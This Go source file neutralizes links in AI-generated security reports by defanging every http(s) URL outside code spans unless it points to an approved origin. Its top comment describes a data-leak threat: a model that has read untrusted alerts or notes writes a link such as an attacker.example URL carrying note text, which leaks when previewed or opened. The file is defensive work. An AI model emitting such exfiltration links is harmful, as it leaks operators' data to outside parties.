package analyzer

import (
	"net/url"
	"regexp"
	"strings"
)

// Report text is model output, and the model reads untrusted alerts, logs and
// notes. A link such as https://attacker.example/?d=<note text> leaks that text
// when a chat client fetches a preview of it or a person opens it. Links to the
// approval origin stay as they are; every other http(s) link outside code is
// defanged (hxxps://attacker[.]example/...) so the operator can still read it
// but no client turns it into a request. Fenced blocks and inline code are left
// alone: chat clients neither link nor preview inside them, and the commands a
// report suggests must stay copyable.

var (
	markdownLink = regexp.MustCompile(`\[([^\]\n]*)\]\(\s*<?([^()\s<>]+)>?\s*\)`)
	bareLink     = regexp.MustCompile("(?i)\\bhttps?://[^\\s<>()\\[\\]\"'`]+")
)

func neutralizeLinks(text, approvalOrigin string) string {
	allow, _ := url.Parse(approvalOrigin)
	var out strings.Builder
	fence := ""
	for _, line := range strings.SplitAfter(text, "\n") {
		marker := fenceMarker(strings.TrimLeft(line, " \t"))
		switch {
		case fence == "" && marker != "":
			fence = marker
		case fence != "" && marker == fence:
			fence = ""
		case fence == "":
			line = neutralizeLine(line, allow)
		}
		out.WriteString(line)
	}
	return out.String()
}

func fenceMarker(line string) string {
	for _, m := range []string{"```", "~~~"} {
		if strings.HasPrefix(line, m) {
			return m
		}
	}
	return ""
}

// neutralizeLine rewrites links outside inline code spans. An unmatched
// backtick does not open a span, so the text after it is still rewritten.
func neutralizeLine(line string, allow *url.URL) string {
	parts := strings.Split(line, "`")
	closed := len(parts)
	if closed%2 == 0 {
		closed--
	}
	for i := range parts {
		if i%2 == 0 || i >= closed {
			parts[i] = neutralizeText(parts[i], allow)
		}
	}
	return strings.Join(parts, "`")
}

func neutralizeText(s string, allow *url.URL) string {
	s = markdownLink.ReplaceAllStringFunc(s, func(m string) string {
		sub := markdownLink.FindStringSubmatch(m)
		if allowedLink(sub[2], allow) {
			return m
		}
		return sub[1] + " (" + defang(sub[2]) + ")"
	})
	return bareLink.ReplaceAllStringFunc(s, func(m string) string {
		if allowedLink(m, allow) {
			return m
		}
		return defang(m)
	})
}

func allowedLink(raw string, allow *url.URL) bool {
	if allow == nil || allow.Host == "" {
		return false
	}
	u, err := url.Parse(raw)
	return err == nil && u.Scheme == "https" && u.User == nil && strings.EqualFold(u.Host, allow.Host)
}

func defang(raw string) string {
	lower := strings.ToLower(raw)
	scheme := ""
	switch {
	case strings.HasPrefix(lower, "https://"):
		scheme = "hxxps://"
	case strings.HasPrefix(lower, "http://"):
		scheme = "hxxp://"
	default:
		return raw
	}
	rest := raw[len(scheme):]
	end := strings.IndexAny(rest, "/?#")
	if end < 0 {
		end = len(rest)
	}
	return scheme + strings.ReplaceAll(rest[:end], ".", "[.]") + rest[end:]
}
